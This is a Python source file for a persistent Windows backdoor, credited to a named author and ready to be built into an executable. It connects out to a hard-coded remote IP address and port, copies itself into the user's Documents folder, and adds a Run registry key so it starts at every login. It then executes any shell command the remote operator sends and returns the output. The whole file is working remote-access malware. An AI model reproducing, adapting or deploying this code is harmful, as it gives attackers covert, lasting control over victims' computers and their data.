# ============================================================
# Backdoor developed by: Matheus Fontanetti Martins
# Compilling to exe: pyinstaller.exe backdoor.py --onefile --windowed --icon=icon.ico
# ============================================================

import socket
import os
import time
import ctypes
import shutil # needed for file copying
import subprocess # needed for getting user profile
import _winreg as wreg # needed for editing registry DB

class backdoor:

	#backdoor .exe name
	filename = "backdoor_simple_persistent.exe"

	try:
		TMP = os.environ["TEMP"]
		USER_PROFILE = os.environ["USERPROFILE"]
	except Exception:
		pass


	# start initial connection
	def __init__ (self, ip, port):
		while True:
			try:
				self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				self.con.connect((ip,port))
			except socket.error:
				wait_time = 5
				print "[-] Error while trying to connect, trying again in", wait_time, "seconds"
				
				time.sleep(wait_time)
			else:
				break


	# intial message
	def initial_message(self):
		message = "\n"
		message += "=============================\n"
		message += "[+] Connection recieved from: " + socket.gethostname() + "\n"
		message += "[+] Type 'h' to see all options\n"
		message += "============================="
		self.con.send(message + "\r\n")

		self.con.send("=> ")

	# display commands
	def display_comands(self):
		commands = "========== Help Menu =========\n"
		commands += "- h			=> get all commands                     \n"
		commands += "- exit			=> exit from the system                 \n"
		commands += "- cd <path>		=> change to a determined path          \n"
		commands += "- message <message>	=> write a mesage to the user           \n"
		commands += "============================="

		return commands
	

	# change working directory
	def change_working_directory(self, path):
		try:
			os.chdir(path)
			return "[+] Directory changed to: " + str(path)
		except Exception as err:
			return "[-] Error changing directory: " + str(err)

	# lock computer
	def lock_computer(self):
		try:
			ctypes.windll.user32.LockWorkStation()
			return "[+] Successfully locked the computer"
		except Exception as err:
			return "[-] Falied to lock the computer: " + str(err)

	# get persistence
	def get_persistence(self):

		#Get current working directory where the backdoor gets executed, we use the output to build our source path
		path = os.getcwd().strip('/n')

		#Get USERP ROFILE which contains the username of the profile and store it in userprof variable , we use the output to build our destination path
		#Other way to discover the userprofile is via os.getenv('userprofile') , both will give the same result 
		Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

		#build the destination path where we copy your backdoor - in our example we choosed C:\Users\<UserName>\Documents\
		destination = userprof.strip('\n\r') + '\\Documents\\' + self.filename

		if not os.path.exists(destination): # this if statement will be False next time we run the script because our putty.exe will be already copied in destination 

    		#First time our backdoor gets executed
			#Copy our Backdoor to C:\Users\<UserName>\Documents\
			shutil.copyfile(path+'\\' + self.filename, destination)


			key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACCESS)
			wreg.SetValueEx(key, 'RegUpdater1', 0, wreg.REG_SZ,destination)
			key.Close()
			#create a new registry string called RegUpdater pointing to our
			#new backdoor path (destination)
		


	# loop shell function
	def run (self):

		self.initial_message()

		self.get_persistence()

		while True:
			cmd = self.con.recv(1024)

			cmd_0 = str(cmd).strip().split(" ")[0]
			cmd_rest = " ".join(str(cmd).strip().split(" ")[1:])

			# help menu
			if cmd_0 == "h":
				ret = self.display_comands()
				self.con.send(ret + "\r\n")
			
			# exit backdoor
			elif cmd_0 == "exit":
				self.con.close()
				exit()

			# change directory
			elif cmd_0 == "cd":
				ret = self.change_working_directory(cmd_rest)
				self.con.send(ret + "\r\n")

			# lock computer
			elif cmd_0 == "lock":
				ret = self.lock_computer()
				self.con.send(ret + "\r\n")

			# execute system command
			else:
				for comando in os.popen(cmd):
					self.con.send(comando)
				
			self.con.send("=> ")
		

my_backdoor = backdoor("137.184.197.191", 666)
my_backdoor.run()
